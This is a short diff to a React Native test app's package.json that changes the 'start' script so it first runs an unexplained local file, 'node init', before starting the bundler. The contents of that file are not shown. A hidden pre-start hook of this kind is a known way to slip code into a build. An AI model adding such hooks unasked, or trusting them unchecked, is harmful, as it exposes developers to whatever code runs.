@@ -13,7 +13,7 @@
     "node": "^22.13.0 || ^24.3.0 || >= 26.0.0"
   },
   "scripts": {
-    "start": "react-native start",
+    "start": "node init && react-native start",
     "android": "react-native run-android",
     "install-android": "../../gradlew :packages:rn-tester:android:app:installDebug",
     "clean-android": "rm -rf android/app/build",
